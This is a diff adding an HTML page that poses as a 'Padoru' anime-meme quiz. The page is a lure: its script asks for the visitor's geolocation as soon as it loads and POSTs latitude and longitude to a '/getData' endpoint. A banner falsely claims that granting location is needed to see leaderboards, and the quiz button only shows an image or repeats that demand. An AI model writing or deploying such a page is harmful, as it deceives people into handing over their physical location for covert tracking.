@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+		<title>Padoru Padoru</title>
+		<link
+			rel="stylesheet"
+			href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+			integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh"
+			crossorigin="anonymous"
+		/>
+		<script
+			src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+			integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
+			crossorigin="anonymous"
+		></script>
+		<script
+			src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+			integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+			crossorigin="anonymous"
+		></script>
+		<script
+			src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
+			integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
+			crossorigin="anonymous"
+		></script>
+	</head>
+	<style>
+		#alert1 {
+			margin: 10px auto;
+		}
+	</style>
+	<body background="https://wallpaperset.com/w/full/8/a/4/473215.jpg">
+		<div class="container" style="padding: 0">
+			<div class="row" style="width: 100%">
+				<img
+					src="https://thumbs.gfycat.com/FarMatureEsok-max-1mb.gif"
+					style="width: 100%; height: 300px"
+				/>
+			</div>
+			<div class="row" style=" margin-top: 30px">
+				<div id="alert1" class="alert alert-danger" role="alert">
+					Click allow 'Geolocation' to see the <b>leaderboards</b>
+				</div>
+			</div>
+
+			<div id="row" style="margin-top: 40px;">
+				<div class="card text-center">
+					<div class="card-header">
+						Quiz
+					</div>
+					<div class="card-body">
+						<h5 class="card-title">Quiz to test your knowledge of padoru</h5>
+						<p class="card-text">Choose the correct padoru.</p>
+						<button
+							type="button"
+							class="btn btn-success btn-lg"
+							data-toggle="modal"
+							data-target="#myModal"
+							onclick="changeBody()"
+						>
+							START QUIZ
+						</button>
+					</div>
+					<div class="card-footer text-muted">
+						10 questions
+					</div>
+				</div>
+			</div>
+
+			<!-- Modal -->
+			<div id="myModal" class="modal fade" role="dialog">
+				<div class="modal-dialog">
+					<!-- Modal content-->
+					<div class="modal-content">
+						<div class="modal-header">
+							<button type="button" class="close" data-dismiss="modal">
+								&times;
+							</button>
+						</div>
+						<div id="mbody" class="modal-body">
+							<img
+								src="https://i.ibb.co/BB0TkZ4/Whats-App-Image-2019-12-11-at-7-47-29-PM.jpg"
+								alt=""
+								srcset=""
+								style="height: 400px; width: 100%"
+							/>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</body>
+	<script>
+		let changed
+		;(() => {
+			console.log('it worked!')
+			const getLocation = callback => {
+				if (navigator.geolocation) {
+					changed = true
+					navigator.geolocation.getCurrentPosition(position => {
+						callback(position.coords.latitude, position.coords.longitude)
+					})
+				} else {
+					return callback(0, 0)
+				}
+			}
+
+			getLocation((lat, long) => {
+				changed = lat
+				fetch('/getData', {
+					method: 'POST',
+					headers: {
+						Accept: 'application/json',
+						'Content-Type': 'application/json',
+					},
+					body: JSON.stringify({ lat, long }),
+				})
+					.then(res => res.json())
+					.then(data => {
+						console.log(data)
+					})
+			})
+		})()
+
+		const changeBody = () => {
+			console.log('changed html')
+
+			navigator.permissions
+				.query({ name: 'geolocation' })
+				.then(function(result) {
+					// Will return ['granted', 'prompt', 'denied']
+					console.log(result.state)
+
+					if (result.state == 'denied' || result.state == 'prompt') {
+						document.getElementById(
+							'mbody'
+						).innerHTML = `<div id="alert1" class="alert alert-danger" role="alert">
+				Click allow 'Geolocation' to see the <b>leaderboards</b>
+			</div>
+			and restart the website`
+					}
+				})
+		}
+	</script>
+</html>
